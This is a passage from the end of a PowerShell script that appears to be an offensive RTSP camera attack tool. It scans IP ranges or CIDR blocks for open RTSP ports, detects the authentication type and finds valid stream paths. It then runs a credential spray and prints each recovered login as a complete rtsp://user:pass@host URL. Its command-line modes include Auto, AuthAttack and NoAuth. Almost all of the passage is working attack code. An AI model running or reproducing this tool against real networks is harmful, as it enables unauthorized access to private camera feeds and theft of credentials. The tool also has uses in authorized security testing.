                    $credsString = "Creds`: " + $result.Credential
                    Write-Host "$credsString `r`n"
                    $fullRTSPString = "rtsp://" + $result.Credential + "@" + $authPath.IPAddress + ":" + $authPath.Port + "/" + $authPath.Path
                    Write-Host -NoNewline -ForegroundColor Green  ">>> "
                    Write-Host -NoNewline "$fullRTSPString"
                    Write-Host -ForegroundColor Green  " <<<`r`n"

                    # Remove the current IP:Port combination from the array
                    $authRequiredPaths = $authRequiredPaths | Where-Object { ($_.IPAddress -ne $authPath.IPAddress) -or ($_.Port -ne $authPath.Port) }
                }
                else {
                    $index++
                }
            }
        }
    } elseif ($null -eq $authRequiredPaths) {
        Write-Host -NoNewline -ForegroundColor Green "[+]"
        Write-Host " No Auth Detected, See results above.`r`n"
    } else {
        Write-Host "Beginning Password Spray:`r`n"

        $result = Get-ValidRTSPCredential -IP $authRequiredPaths.IPAddress -Port $authRequiredPaths.Port -Path $authRequiredPaths.Path -authType $authRequiredPaths.authType

        if ($result.CredentialFound) {
            $validCredentials += [PSCustomObject]@{
                IPAddress   = $authRequiredPaths.IPAddress
                Port        = $authRequiredPaths.Port
                Path        = $authRequiredPaths.Path
                Credentials = $result.Credential
            }

            Write-Host -ForegroundColor Yellow -NoNewline "====="
            Write-Host -NoNewline " Found Credentials "
            Write-Host -ForegroundColor Yellow "====="
                
            Write-Host -NoNewline -ForegroundColor Green  "[+] "
            $authString = $authRequiredPaths.IPAddress + ":" + $authRequiredPaths.Port + "/" + $authRequiredPaths.Path
            Write-Host "Path: $authString"
            Write-Host -NoNewline -ForegroundColor Green  "[+] "
            $credsString = "Creds`: " + $result.Credential
            Write-Host "$credsString `r`n"
            $fullRTSPString = "rtsp://" + $result.Credential + "@" + $authRequiredPaths.IPAddress + ":" + $authRequiredPaths.Port + "/" + $authRequiredPaths.Path
            Write-Host -NoNewline -ForegroundColor Green  ">>> "
            Write-Host -NoNewline "$fullRTSPString"
            Write-Host -ForegroundColor Green  " <<<`r`n"
        }
    }

    Write-Host "Scan completed.`r`n" -ForegroundColor Green
    Write-Host "=========================================================`r`n"
}


function FullAuto {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$Targets
    )

    $ipRange = Get-IpRange -Target $Targets
    $openPorts = Get-OpenRTSPPorts -IPAddress $ipRange
    
    # Check if there are any unique IP addresses with open ports
    $uniqueIPsWithOpenPorts = $openPorts | Select-Object -ExpandProperty IPAddress -Unique

    if ($uniqueIPsWithOpenPorts.Count -gt 0) {
        $authTypeResult = Get-AuthType -OpenPorts $openPorts
        $authRequiredPaths = Get-ValidRTSPPaths -OpenPorts $authTypeResult
        $validCredentials = @()

        if ($authRequiredPaths.Count -gt 0) {

            Write-Host "Beginning Password Spray:`r`n"

            $index = 0

            while ($index -lt $authRequiredPaths.Count) {
                $authPath = $authRequiredPaths[$index]
                $result = Get-ValidRTSPCredential -IP $authPath.IPAddress -Port $authPath.Port -Path $authPath.Path -authType $authPath.authType

                if ($result.CredentialFound) {
                    $validCredentials += [PSCustomObject]@{
                        IPAddress   = $authPath.IPAddress
                        Port        = $authPath.Port
                        Path        = $authPath.Path
                        Credentials = $result.Credential
                    }

                    Write-Host -ForegroundColor Yellow -NoNewline "====="
                    Write-Host -NoNewline " Found Credentials "
                    Write-Host -ForegroundColor Yellow "====="
                
                    Write-Host -NoNewline -ForegroundColor Green  "[+] "
                    $authString = $authPath.IPAddress + ":" + $authPath.Port + "/" + $authPath.Path
                    Write-Host "Path: $authString"
                    Write-Host -NoNewline -ForegroundColor Green  "[+] "
                    $credsString = "Creds`: " + $result.Credential
                    Write-Host "$credsString `r`n"
                    $fullRTSPString = "rtsp://" + $result.Credential + "@" + $authPath.IPAddress + ":" + $authPath.Port + "/" + $authPath.Path
                    Write-Host -NoNewline -ForegroundColor Green  ">>> "
                    Write-Host -NoNewline "$fullRTSPString"
                    Write-Host -ForegroundColor Green  " <<<`r`n"

                    # Remove the current IP:Port combination from the array
                    $authRequiredPaths = $authRequiredPaths | Where-Object { ($_.IPAddress -ne $authPath.IPAddress) -or ($_.Port -ne $authPath.Port) }

                    # Reset the index to start processing from the beginning of the array
                    $index = 0
                } else {
                    $index++
                }
            }


        }
        else {
            Write-Host "=========================================================`r`n"
            Write-Host "No authentication required, see results above.`r`n"
            Write-Host "Scan completed.`r`n" -ForegroundColor Green
            Write-Host "=========================================================`r`n"
        }

    }
    Write-Host "`r`nScan completed.`r`n" -ForegroundColor Green
    Write-Host "=========================================================`r`n"
}



if ($Search) {

    if ($search -match '^\b((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}(\/\b(1[6-9]|2[0-9]|3[0-2])\b)?$') {
    
        Scan -Targets $Search

    } else {

        Write-Host -NoNewline -ForegroundColor Red "[-]"
        Write-Host " Please ensure you are entering a valid IP(/CIDR) e.g. 10.0.0.1 or 192.168.0.0/24"
    }


} elseif ($NoAuth){

    if ($NoAuth -match '^\b((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}(\/\b(1[6-9]|2[0-9]|3[0-2])\b)?$') {
    
        NoAuthScan -Targets $NoAuth

    } else {

        Write-Host -NoNewline -ForegroundColor Red "[-]"
        Write-Host " Please ensure you are entering a valid IP(/CIDR) e.g. 10.0.0.1 or 192.168.0.0/24"
    }
 

} elseif ($AuthAttack){

    if ($AuthAttack -match '^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}:\b((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9]{3})|([1-5][0-9]{4})|([0-5]{0,5})|([0-9]{1,4}))\b$') {
        if ($Path) {
            Write-Host -NoNewline -ForegroundColor Yellow "[?]"
			Write-Host " Please note that if no credentials are found the path could be invalid."
			Write-Host -NoNewline -ForegroundColor Yellow "[?]"
			Write-Host " Try with -NoAuth or -Auto next.`r`n"
			
			AuthAttack -Target $AuthAttack -Path $Path

        } else {
            Write-Host -NoNewline -ForegroundColor Yellow "[?]"
			Write-Host " Checking Connection and Paths at Target`r`n"

            $result = AuthAttack -Target $AuthAttack
    }
    
    } else {
     Write-Host -NoNewline -ForegroundColor Red "[-]"
     Write-Host " Please ensure you are entering a valid IP:Port combination e.g. 10.0.0.1:554"

    }  
 
} elseif ($Auto){

    if ($Auto -match '^\b((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}(\/\b(1[6-9]|2[0-9]|3[0-2])\b)?$') {
    
        FullAuto -Targets $Auto

    } else {

        Write-Host -NoNewline -ForegroundColor Red "[-]"
        Write-Host " Please ensure you are entering a valid IP(/CIDR) e.g. 10.0.0.1 or 192.168.0.0/24"

    }

} 

}
